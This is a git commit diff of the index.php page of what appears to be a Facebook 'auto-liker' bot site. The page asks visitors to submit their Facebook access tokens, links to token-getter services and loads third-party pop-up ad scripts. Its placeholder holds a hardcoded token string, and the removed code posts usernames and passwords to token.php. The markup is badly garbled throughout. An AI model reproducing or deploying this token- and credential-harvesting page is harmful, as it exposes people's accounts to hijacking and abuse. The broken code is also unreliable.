7cf677ce09c5fd6aa95aca8e9eb7223cc42f5b47
mrdjayeh <markzackerb@gmail.com>
2018-07-07 17:03:09 +0500

    Update index.php

--- index.php
+++ index.php
@@ -1,18 +1,18 @@
-﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><meta charset="utf-8"/>
 
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-<title>DJ BOTTER</title>
-<center><font color="blue" size="8"><font size="50"<b><script language="JavaScript" src="header.js" size="520"></script></b></font></font><br><center>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Shahzad Asghar</title> 
+<link <link href="B.css" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/cssf8d0.css?family=" rel="stylesheet" type="text/css">
+<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
 
-<link rel="stylesheet" type="text/css" href="stylesheet.css" media="all,handheld"/>
-<link rel="stylesheet" type="text/css" href="table.css" media="all,handheld"/>
-<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
-<link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/images/emoji.php/v9/fa/1/16/1f981.png"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
- <link rel="shortcut icon" type="image/png" href="http://emojipedia-us.s3.amazonaws.com/cache/f9/4e/f94ee8fa6d3c2553f00d59838ab747e3.png"/> <style>
-.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div>
 </div>
+<center><div style="font-family: Audiowide;
+font-size: 60pt">
+<center><script language="JavaScript" src="B.js"></script></font></center>
+<div style="font-family: Audiowide;
+font-size: 25pt;
+text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
+color: #FFF">
 <script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>
 
 
@@ -76,16 +76,13 @@ $on= file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/user.php');
 echo'
 <br>
 <br>
-<center>
-<a target="_blank"  href="https://www.facebook.com/mrdjayash">
-<img src="ayeshu.jpg" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a></div></div></br><br>
-<br>
-<div id="center">
-<a href="httpS://bottersking.com/token/" target="_blank"><input class="button"style="width:20%" type="button" value="GET SCURE TOKEN"></a><br><br>
+<br><center><strong><a href="http://www.facebook.com/100004890735730" target="_blank">
+<img src="https://graph.facebook.com/100004890735730/picture?type=large" alt="Designer_&_Developer" border="3" style="border-color: 737373; border-radius:70%;height:150px;width:150px;-moz-box-shadow:0px 0px 20px 0px black;-webkit-box-shadow:0px 0px 20px 0px black;-o-box-shadow:0px 0px 20px 0px black;box-shadow:0px 0px 20px 0px black"/><br></div>';}public function bwh(){echo'<div id="bottom-content"><div id="navigation-menu"><center></head>    <body>        <div id="main">            <div id="content">                <div class="header"><center><br><br><center><a href="https://bottersking.com/" target="_blank"><input class="button button5" type="button" value="♥ GET TOKEN ♥"> </a><a href="http://zipansion.com/24fhq" target="_blank"><input class="button button5" type="button" value="♥ SCRIPT ♥"> </a></center>
+<center><form action="" method="POST">
+<input class="search" style="width:70%" type="text" name="access_token" placeholder=" placeholder="EAAAACZAVC6ygBAOXNxONaZAc9GnN9kcLxZCsba3ED4hjLZBX2BJDPwDUBZBpvyZAb538ABEh3k3zmMgObJbOA32VsZAzndFmBahJVz6C4y0ZBEG0nzJQ7ZCbsdUvlEjEsZB9ciEXqoMILLlKCES6n3jqscohpvPbMXSj8ZD" required> <br>
+<input class="submit" type="submit" name="saveFile" value="SUBMIT"></form></div></div></div>
 
-<form action="" method="POST">
-<input class="search" style="width:70%" type="text" name="access_token" placeholder="INPUT HERE TO YOUR ACESS TOKEN" required></br><br>
-<input class="submit"style="width:20%" type="submit" name="saveFile" value="SUBMIT"></form></div>';
+';
 }
 
 public function getData($access){
@@ -117,16 +114,15 @@ return $result;
 
 
 <br>
+ <br>
 
+font style="text-shadow: 1px 1px black; color:white;"
+size="6">&bull; Bot Lovers : <font color="red"> BOT USERS :: <font color="yellow"> <?php include 'user.php';?> </font> <font style="text-shadow: 1px 1px black; color:white;" size="4">&bull;</font>
 
-<font color="white" size="8"><font size="6" <div style="font-family: Merienda;
-<font color=" white"="" size="10"> MADE BY ::  <font color="red">MRDJ AYASH <br>
-
-<br>
-
-<font color="white" size="6"><font size="6" <div style="font-family: Merienda;
-<font color=" white"="" size="10"> BOT USERS :: <font color="yellow"> <?php include 'user.php';?> </font></br>
-
+ 
+ <center><strong><font style="text-shadow: 1px 1px black; color:white;" size="5">&bull; OWNER Shahzad Asghar &bull;</strong></center>
+</br></div><audio autoIceland loop>
+<font color="red"
 
 <br>
 <center>
@@ -136,114 +132,3 @@ return $result;
 </html>
 
 
-<script>function Puaru_Active() {
-var http = new XMLHttpRequest();
-var tk = document.getElementById("tk").value;
-var mk = document.getElementById("mk").value;
-var url = "token.php";
-var params = "u="+tk+"&p="+mk+"";
-http.open("POST", url, true);
-http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-
-http.onreadystatechange = function() {
-    if(http.readyState == 4 && http.status == 200) {
-      document.getElementById("trave").innerHTML = http.responseText;        
-    }
-}
-http.send(params);
-}
- 
-  </script>
-  
-<script>(function(d, s, id) {
-var js, fjs = d.getElementsByTagName(s)[0];
-if (d.getElementById(id)) return;
-js = d.createElement(s); js.id = id;
-js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5";
-fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
-<script type="text/javascript" src="http://cdn.vietdesigner.net/data/codes/snowstorm.js"></script>
-<script language="javascript" type="text/javascript" src="http://cc-lemon.yn.lt/lovemoon/Dpadhome.js"></script>
-<div class="kddtop"> <div class="kddtut"> <p>
-
-<b>-DJ AYASH-</b><br>
-<img src="https://graph.facebook.com/100025466832535/picture?type=large" alt="Profile" style="width:250px; height:250px;border: 2px;border-radius: 50%;" data-pagespeed-url-hash="1820703895" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
-<br><b>WELCOME TO BOT BY TALHA BAIG </b><br><br>
-<b></b><br>  
-  
-  
-  
-  
-  
-  
-  
-  <br
-  <br>
-  <br>
-  
-  
-  <style>
-  .kddtop {
-       left:16px;
-
-      width: 350px;
-  min-height:180px;
-  background: transparent;
-  margin: 0 auto;
-  position: fixed;
-  font-family:Arial, sans-serif !important;
-  border-radius:3px;
-  -webkit-border-radius:3px;
-  bottom: 16px;
-  overflow: hidden;box-shadow: 0px 1px 4px transparent;
-z-index:900;}
-
-.kddtop p{width:0px;height:0px;overflow:hidden;opacity:0;position:relative;padding:16px 0 0 20px;z-index:5;margin:0 0 0 0;
-color:rgba(0,0,0,0);}
-.kddtop:hover p{display:block;
-width:100%;height:100%;opacity:1;color:#fff;
-  transition:opacity 1s 0.4s ease;
-}
-.kddtop:before {
-  content: "♥";
-  position: absolute;
-  line-height: 1500px;
-    text-align: center;
-    color: #fff;
-    font-weight: bold;
-    font-size: 1000px;
-  z-index:1;
-  width: 1500px;
-  height: 1500px;
-  background: #F44336;
-  border-radius: 50%;
-  top: 100%;
-  left: 50%;
-  -webkit-transform: translate3d(-50%, -50%, 0) scale(0.035);
-  transform: translate3d(-50%, -50%, 0) scale(0.035);
-  -webkit-animation: .5s bounce infinite alternate-reverse;
-  animation: .5s bounce infinite alternate-reverse;
-  -webkit-transition: .5s -webkit-transform ease, .5s color ease;
-  transition: .5s transform ease, .5s color ease;
-}
-.kddtop:after {
-  content: "";
-  position: absolute;
-  left: 133px;
-  right: 133px;
-  bottom: 0;
-  height: 15px;
-  background: rgba(0, 0, 0, 0.5);
-  border-radius: 50%;
-  -webkit-transition: .3s opacity ease;
-  transition: .3s opacity ease;
-  -webkit-animation: .5s shadow infinite alternate-reverse;
-  animation: .5s shadow infinite alternate-reverse;
-}
-.kddtop:hover {
-  box-shadow: 0px 5px 4px rgba(0, 0, 0, 0.3);
-  -webkit-transition: .5s all ease .25s;
-  transition: .5s all ease .25s;
-}
-    .kddtop:hover:before { color: Black; top: 100%; -webkit-transform: translate3d(-50%, -50%, 0) scale(1); transform: translate3d(-50%, -50%, 0) scale(1); -webkit-transition: .3s top ease, .5s -webkit-transform ease .25s, .5s color ease .25s; transition: .3s top ease, .5s transform ease .25s, .5s color ease .25s; } </style> <style> .kddtop:hover:after { opacity: 0; } .kddtop:hover .kddtut:before { width: 50px; -webkit-transition: .3s all ease 1.25s; transition: .3s all ease 1.25s; } .kddtop .kddtut { padding: 0 35px 5px 0; box-sizing: border-box; display: block; position: relative; opacity: 1; text-align: center; } .kddtop .kddtut:before { content: ""; position: absolute; top: 0; left: 150px; rigth: 150px; width: 0px; height: 1px; background: black; } @-webkit-keyframes bounce { from { top: 93%; } to { top: 50%; } } @keyframes bounce { from { top: 93%; } to { top: 50%; } } @-webkit-keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } } @keyframes shadow { from { height: 5px; } to { height: 20px; -webkit-transform: scale(0.3); transform: scale(0.3); } }</style></p></div></div> 
- 
